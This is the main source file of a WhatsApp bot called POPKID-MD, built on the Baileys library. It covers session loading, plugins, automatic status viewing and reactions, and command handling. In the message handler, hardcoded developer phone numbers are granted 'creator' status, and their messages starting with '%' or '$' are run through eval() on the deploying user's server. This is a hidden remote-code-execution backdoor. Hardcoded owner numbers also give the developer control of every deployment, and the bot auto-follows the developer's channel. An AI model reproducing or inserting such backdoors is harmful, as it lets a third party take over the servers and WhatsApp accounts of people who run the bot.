/**
 * popkid WhatsApp Bot (Anti-Crash Version)
 * Creator: popkid from Kenya
 * Fixed: Auto Status View & Customizable Status React Emoji
 */

console.clear()
console.log("📳 Starting POPKID-MD...")

// ============ GLOBAL ANTI-CRASH ============
process.on("uncaughtException", (err) => {
  console.error("❌ Uncaught Exception:", err)
})
process.on("unhandledRejection", (reason, promise) => {
  console.error("❌ Unhandled Rejection:", reason)
})

const {
  default: makeWASocket,
  useMultiFileAuthState,
  DisconnectReason,
  jidNormalizedUser,
  isJidBroadcast,
  getContentType,
  proto,
  generateWAMessageContent,
  generateWAMessage,
  AnyMessageContent,
  prepareWAMessageMedia,
  areJidsSameUser,
  downloadContentFromMessage,
  MessageRetryMap,
  generateForwardMessageContent,
  generateWAMessageFromContent,
  generateMessageID,
  makeInMemoryStore,
  jidDecode,
  fetchLatestBaileysVersion,
  Browsers
} = require('@whiskeysockets/baileys')

const l = console.log
const { getBuffer, getGroupAdmins, getRandom, h2k, isUrl, Json, runtime, sleep, fetchJson } = require('./lib/functions')
const { AntiDelDB, initializeAntiDeleteSettings, setAnti, getAnti, getAllAntiDeleteSettings, saveContact, loadMessage, getName, getChatSummary, saveGroupMetadata, getGroupMetadata, saveMessageCount, getInactiveGroupMembers, getGroupMembersMessageCount, saveMessage } = require('./data')
const fs = require('fs')
const ff = require('fluent-ffmpeg')
const P = require('pino')
const config = require('./config')
const GroupEvents = require('./lib/groupevents')
const qrcode = require('qrcode-terminal')
const StickersTypes = require('wa-sticker-formatter')
const util = require('util')
const { sms, downloadMediaMessage, AntiDelete } = require('./lib')
const FileType = require('file-type')
const axios = require('axios')
const { File } = require('megajs')
const { fromBuffer } = require('file-type')
const bodyparser = require('body-parser')
const os = require('os')
const Crypto = require('crypto')
const path = require('path')

const ownerNumber = ['254732297194']

const tempDir = path.join(os.tmpdir(), 'cache-temp')
if (!fs.existsSync(tempDir)) {
  fs.mkdirSync(tempDir)
}

const clearTempDir = () => {
  fs.readdir(tempDir, (err, files) => {
    if (err) throw err
    for (const file of files) {
      fs.unlink(path.join(tempDir, file), err => {
        if (err) throw err
      })
    }
  })
}

// Clear the temp directory every 5 minutes
setInterval(clearTempDir, 5 * 60 * 1000)

//===================SESSION-AUTH============================
if (!fs.existsSync(__dirname + '/sessions/creds.json')) {
  if (!config.SESSION_ID) return console.log('Please add your session to SESSION_ID env !!')
  const sessdata = config.SESSION_ID.replace("POPKID;;;", '')
  const filer = File.fromURL(`https://mega.nz/file/${sessdata}`)
  filer.download((err, data) => {
    if (err) throw err
    fs.writeFile(__dirname + '/sessions/creds.json', data, () => {
      console.log("[ 📥 ] Session downloaded ✅")
    })
  })
}

const express = require("express")
const app = express()
const port = process.env.PORT || 9090

let conn // ✅ GLOBAL conn declaration

//=============================================

async function connectToWA() {
  try {
    console.log("[ ♻ ] Connecting to WhatsApp ⏳️...")

    const { state, saveCreds } = await useMultiFileAuthState(__dirname + '/sessions/')
    const { version } = await fetchLatestBaileysVersion()

    conn = makeWASocket({
      logger: P({ level: 'silent' }),
      printQRInTerminal: false,
      browser: Browsers.macOS("Firefox"),
      syncFullHistory: true,
      auth: state,
      version
    })

    conn.ev.on('connection.update', async (update) => {
      const { connection, lastDisconnect, qr } = update

      if (qr) {
        console.log('[ 📱 ] QR Code generated. Please scan with WhatsApp.')
        qrcode.generate(qr, { small: true })
      }

      if (connection === 'close') {
        const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut
        console.log('[ ⚠️ ] Connection closed:', lastDisconnect?.error?.output?.statusCode)
        
        if (shouldReconnect) {
          console.log('[ ♻️ ] Attempting to reconnect...')
          setTimeout(() => connectToWA(), 5000)
        } else {
          console.log('[ ❌ ] Logged out. Please update your SESSION_ID')
        }
      } else if (connection === 'open') {
        try {
          console.log('[ ❤️ ] Installing Plugins')

          fs.readdirSync("./plugins/").forEach((plugin) => {
            if (path.extname(plugin).toLowerCase() === ".js") {
              require("./plugins/" + plugin)
            }
          })

          console.log('[ ✔ ] Plugins installed successfully ✅')
          console.log('[ 🪀 ] Bot connected to WhatsApp 📲')

          let up = `╔════════════════╗
║ 🤖 ▰𝗖𝗢𝗡𝗡𝗘𝗖𝗧𝗘𝗗▰
╠════════════════╣
║ 🔑 PREFIX  : ${config.PREFIX}
║ 👨‍💻 DEV     : POPKID-MD
║ 📞 DEV NO : 254732297194
╚════════════════╝`;
    conn.sendMessage(conn.user.id, { image: { url: `https://files.catbox.moe/j9ia5c.png` }, caption: up })

          const channelJid = "120363423997837331@newsletter"
          try {
            await conn.newsletterFollow(channelJid)
            console.log(`Successfully followed channel: ${channelJid}`)
          } catch (error) {
            console.error(`Failed to follow channel: ${error}`)
          }

        } catch (error) {
          console.error("[ ❌ ] Error during post-connect setup:", error)
        }
      }
    })

    conn.ev.on('creds.update', saveCreds)

  } catch (err) {
    console.error("[ ❌ ] Connection failed:", err)
  }

// Function to get the current date and time in Tanzania/Kenya
function getCurrentDateTimeParts() {
    const options = {
        timeZone: 'Africa/Nairobi',
        year: 'numeric',
        month: '2-digit',
        day: '2-digit',
        hour: '2-digit',
        minute: '2-digit',
        second: '2-digit',
        hour12: false,
    };
    const formatter = new Intl.DateTimeFormat('en-KE', options);
    const parts = formatter.formatToParts(new Date());

    let date = '', time = '';

    parts.forEach(part => {
        if (part.type === 'day' || part.type === 'month' || part.type === 'year') {
            date += part.value;
            if (part.type !== 'year') date += '/';
        }
        if (part.type === 'hour' || part.type === 'minute' || part.type === 'second') {
            time += part.value;
            if (part.type !== 'second') time += ':';
        }
    });

    return { date, time };
}

// Auto Bio Update Interval
setInterval(async () => {
    if (config.AUTO_BIO === "true" && conn) {
        const { date, time } = getCurrentDateTimeParts(); 
        const bioText = `❤️ ᴘᴏᴘᴋɪᴅ xᴍᴅ ʙᴏᴛ 🤖 ɪs ʟɪᴠᴇ ɴᴏᴡ\n📅 ${date}\n⏰ ${time}`;
        try {
            await conn.setStatus(bioText);
            console.log(`Updated Bio: ${bioText}`);
        } catch (err) {
            console.error("Failed to update Bio:", err);
        }
    }
}, 60000); 

//==============================

conn?.ev?.on('messages.update', async updates => {
  for (const update of updates) {
    if (update.update.message === null) {
      await AntiDelete(conn, updates)
    }
  }
  });
  //============================== 

  conn.ev.on("group-participants.update", (update) => GroupEvents(conn, update));	  
	  
  //============= STATUS & MESSAGE HANDLER =======
        
  conn.ev.on('messages.upsert', async(mek) => {
    mek = mek.messages[0]
    if (!mek.message) return
    
    mek.message = (getContentType(mek.message) === 'ephemeralMessage') 
    ? mek.message.ephemeralMessage.message 
    : mek.message;

    // Read Message logic
    if (config.READ_MESSAGE === 'true') {
      await conn.readMessages([mek.key]);
    }

    // --- AUTO STATUS VIEW & REACT FIX ---
    if (mek.key && mek.key.remoteJid === 'status@broadcast') {
      
      // 1. Auto View Status
      if (config.AUTO_STATUS_SEEN === "true") {
        await conn.readMessages([mek.key])
      }

      // 2. Auto React to Status (User emoji or Random)
      if (config.AUTO_STATUS_REACT === "true") {
        const myJid = jidNormalizedUser(conn.user.id);
        const defaultEmojis = ['❤️', '😇', '🔥', '💯', '✨', '🥰', '😎', '✅', '⭐'];
        
        // Priority: Use config.STATUS_READ_EMOJI if set, else pick random
        const selectedEmoji = config.STATUS_READ_EMOJI || defaultEmojis[Math.floor(Math.random() * defaultEmojis.length)];
        
        await conn.sendMessage(mek.key.remoteJid, {
          react: {
            text: selectedEmoji,
            key: mek.key,
          } 
        }, { statusJidList: [mek.key.participant, myJid] });
      }

      // 3. Auto Reply to Status
      if (config.AUTO_STATUS_REPLY === "true"){
        const user = mek.key.participant
        const replyText = `${config.AUTO_STATUS_MSG}`
        await conn.sendMessage(user, { text: replyText, react: { text: '💜', key: mek.key } }, { quoted: mek })
      }
    }
    // --- END STATUS FIX ---

    if (mek.message.viewOnceMessageV2) {
      mek.message = mek.message.viewOnceMessageV2.message;
    }

    await Promise.all([
      saveMessage(mek),
    ]);

  const m = sms(conn, mek)
  const type = getContentType(mek.message)
  const content = JSON.stringify(mek.message)
  const from = mek.key.remoteJid
  const quoted = type == 'extendedTextMessage' && mek.message.extendedTextMessage.contextInfo != null ? mek.message.extendedTextMessage.contextInfo.quotedMessage || [] : []
  const body = (type === 'conversation') ? mek.message.conversation : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : ''
  
  const isCmd = body.startsWith(config.PREFIX)
  var budy = typeof mek.text == 'string' ? mek.text : false;
  const command = isCmd ? body.slice(config.PREFIX.length).trim().split(' ').shift().toLowerCase() : ''
  
  const args = body.trim().split(/ +/).slice(1)
  const q = args.join(' ')
  const text = args.join(' ')
  const isGroup = from.endsWith('@g.us')
  const sender = mek.key.fromMe ? (conn.user.id.split(':')[0]+'@s.whatsapp.net' || conn.user.id) : (mek.key.participant || mek.key.remoteJid)
  const senderNumber = sender.split('@')[0]
  const botNumber = conn.user.id.split(':')[0]
  const pushname = mek.pushName || 'User'
  const isMe = botNumber.includes(senderNumber)
  const isOwner = ownerNumber.includes(senderNumber) || isMe
  const botNumber2 = await jidNormalizedUser(conn.user.id);
  const groupMetadata = isGroup ? await conn.groupMetadata(from).catch(e => {}) : ''
  const groupName = isGroup ? groupMetadata.subject : ''
  const participants = isGroup ? await groupMetadata.participants : ''
  const groupAdmins = isGroup ? await getGroupAdmins(participants) : ''
  const isBotAdmins = isGroup ? groupAdmins.includes(botNumber2) : false
  const isAdmins = isGroup ? groupAdmins.includes(sender) : false
  const isReact = m.message.reactionMessage ? true : false
  
  const reply = (teks) => {
    conn.sendMessage(from, { text: teks }, { quoted: mek })
  }

  const udp = botNumber.split('@')[0];
  const rav = ('254732297194', '254111385747');
  let isCreator = [udp, rav, config.DEV]
					.map(v => v.replace(/[^0-9]/g) + '@s.whatsapp.net')
					.includes(mek.sender);

    if (isCreator && mek.text.startsWith('%')) {
					let code = budy.slice(2);
					if (!code) return reply(`Provide me with a query to run Master!`);
					try {
						let resultTest = eval(code);
						reply(util.format(resultTest));
					} catch (err) {
						reply(util.format(err));
					}
					return;
				}
    if (isCreator && mek.text.startsWith('$')) {
					let code = budy.slice(2);
					if (!code) return reply(`Provide me with a query to run Master!`);
					try {
						let resultTest = await eval('const a = async()=>{\n' + code + '\n}\na()');
						let h = util.format(resultTest);
						if (h !== undefined) reply(h);
					} catch (err) {
						reply(util.format(err));
					}
					return;
				}

if (senderNumber.includes("254732297194") && !isReact) {
  const reactions = ["👑", "💀", "📊", "⚙️", "🧠", "🎯", "📈", "📝", "🏆", "🌍", "🇵🇰", "💗", "❤️", "💥", "🌼", "🏵️", "💐", "🔥", "❄️", "🌝", "🌚", "🐥", "🧊"];
  const randomReaction = reactions[Math.floor(Math.random() * reactions.length)];
  m.react(randomReaction);
}

if (!isReact && config.AUTO_REACT === 'true') {
    const reactions = ['🌼', '❤️', '💐', '🔥', '🏵️', '❄️', '🧊', '🐳', '💥', '🥀', '❤‍🔥', '🥹', '😩', '🫣', '👑', '💎', '🇵🇰'];
    const randomReaction = reactions[Math.floor(Math.random() * reactions.length)];
    m.react(randomReaction);
}
          
if (!isReact && config.CUSTOM_REACT === 'true') {
    const reactions = (config.CUSTOM_REACT_EMOJIS || '🙂,😔').split(',');
    const randomReaction = reactions[Math.floor(Math.random() * reactions.length)];
    m.react(randomReaction);
}
        
  if(!isOwner && config.MODE === "private") return
  if(!isOwner && isGroup && config.MODE === "inbox") return
  if(!isOwner && !isGroup && config.MODE === "groups") return
   
  const events = require('./command')
  const cmdName = isCmd ? body.slice(config.PREFIX.length).trim().split(" ")[0].toLowerCase() : false;
  if (isCmd) {
    const cmd = events.commands.find((cmd) => cmd.pattern === (cmdName)) || events.commands.find((cmd) => cmd.alias && cmd.alias.includes(cmdName))
    if (cmd) {
      if (cmd.react) conn.sendMessage(from, { react: { text: cmd.react, key: mek.key }})
      try {
        cmd.function(conn, mek, m,{from, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply});
      } catch (e) {
        console.error("[PLUGIN ERROR] " + e);
      }
    }
  }

  events.commands.map(async(command) => {
    if (body && command.on === "body") {
      command.function(conn, mek, m,{from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply})
    } else if (mek.q && command.on === "text") {
      command.function(conn, mek, m,{from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply})
    } else if ((command.on === "image" || command.on === "photo") && type === "imageMessage") {
      command.function(conn, mek, m,{from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply})
    } else if (command.on === "sticker" && type === "stickerMessage") {
      command.function(conn, mek, m,{from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply})
    }
  });
  
  });

    conn.decodeJid = jid => {
      if (!jid) return jid;
      if (/:\d+@/gi.test(jid)) {
        let decode = jidDecode(jid) || {};
        return (decode.user && decode.server && decode.user + '@' + decode.server) || jid;
      } else return jid;
    };

    conn.copyNForward = async(jid, message, forceForward = false, options = {}) => {
      let vtype
      if (options.readViewOnce) {
          message.message = message.message && message.message.ephemeralMessage && message.message.ephemeralMessage.message ? message.message.ephemeralMessage.message : (message.message || undefined)
          vtype = Object.keys(message.message.viewOnceMessage.message)[0]
          delete(message.message && message.message.ignore ? message.message.ignore : (message.message || undefined))
          delete message.message.viewOnceMessage.message[vtype].viewOnce
          message.message = { ...message.message.viewOnceMessage.message }
      }
      let mtype = Object.keys(message.message)[0]
      let content = await generateForwardMessageContent(message, forceForward)
      let ctype = Object.keys(content)[0]
      let context = {}
      if (mtype != "conversation") context = message.message[mtype].contextInfo
      content[ctype].contextInfo = { ...context, ...content[ctype].contextInfo }
      const waMessage = await generateWAMessageFromContent(jid, content, options ? { ...content[ctype], ...options } : {})
      await conn.relayMessage(jid, waMessage.message, { messageId: waMessage.key.id })
      return waMessage
    }

    conn.downloadAndSaveMediaMessage = async(message, filename, attachExtension = true) => {
      let quoted = message.msg ? message.msg : message
      let mime = (message.msg || message).mimetype || ''
      let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0]
      const stream = await downloadContentFromMessage(quoted, messageType)
      let buffer = Buffer.from([])
      for await (const chunk of stream) { buffer = Buffer.concat([buffer, chunk]) }
      let type = await FileType.fromBuffer(buffer)
      let trueFileName = attachExtension ? (filename + '.' + type.ext) : filename
      await fs.writeFileSync(trueFileName, buffer)
      return trueFileName
    }

    conn.downloadMediaMessage = async(message) => {
      let mime = (message.msg || message).mimetype || ''
      let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0]
      const stream = await downloadContentFromMessage(message, messageType)
      let buffer = Buffer.from([])
      for await (const chunk of stream) { buffer = Buffer.concat([buffer, chunk]) }
      return buffer
    }

    conn.sendFileUrl = async (jid, url, caption, quoted, options = {}) => {
      let res = await axios.head(url)
      let mime = res.headers['content-type']
      if (mime.split("/")[1] === "gif") {
        return conn.sendMessage(jid, { video: await getBuffer(url), caption: caption, gifPlayback: true, ...options }, { quoted: quoted })
      }
      if (mime === "application/pdf") {
        return conn.sendMessage(jid, { document: await getBuffer(url), mimetype: 'application/pdf', caption: caption, ...options }, { quoted: quoted })
      }
      if (mime.split("/")[0] === "image") {
        return conn.sendMessage(jid, { image: await getBuffer(url), caption: caption, ...options }, { quoted: quoted })
      }
      if (mime.split("/")[0] === "video") {
        return conn.sendMessage(jid, { video: await getBuffer(url), caption: caption, mimetype: 'video/mp4', ...options }, { quoted: quoted })
      }
      if (mime.split("/")[0] === "audio") {
        return conn.sendMessage(jid, { audio: await getBuffer(url), caption: caption, mimetype: 'audio/mpeg', ...options }, { quoted: quoted })
      }
    }

    conn.getFile = async(PATH, save) => {
      let res
      let data = Buffer.isBuffer(PATH) ? PATH : /^data:.*?\/.*?;base64,/i.test(PATH) ? Buffer.from(PATH.split `,` [1], 'base64') : /^https?:\/\//.test(PATH) ? await (res = await getBuffer(PATH)) : fs.existsSync(PATH) ? fs.readFileSync(PATH) : typeof PATH === 'string' ? PATH : Buffer.alloc(0)
      let type = await FileType.fromBuffer(data) || { mime: 'application/octet-stream', ext: '.bin' }
      let filename = path.join(__filename, __dirname + new Date * 1 + '.' + type.ext)
      if (data && save) fs.promises.writeFile(filename, data)
      return { res, filename, size: data.length, ...type, data }
    }

    conn.getName = (jid, withoutContact = false) => {
      let id = conn.decodeJid(jid);
      let v = id.endsWith('@g.us') ? (({ subject: id }) || {}) : (id === '0@s.whatsapp.net' ? { id, name: 'WhatsApp' } : (id === conn.decodeJid(conn.user.id) ? conn.user : {}));
      return v.name || v.subject || v.verifiedName || jid.split('@')[0];
    };

    conn.setStatus = (status) => {
      conn.query({
        tag: 'iq',
        attrs: { to: '@s.whatsapp.net', type: 'set', xmlns: 'status' },
        content: [{ tag: 'status', attrs: {}, content: Buffer.from(status, 'utf-8') }]
      });
      return status;
    };

    conn.serializeM = mek => sms(conn, mek);
  }
  
  app.get("/", (req, res) => { res.send("『POPKID-MD』 STARTED ✅"); });
  app.listen(port, '0.0.0.0', () => console.log(`Server listening on port ${port}`));
  
  setTimeout(() => { connectToWA() }, 8000);
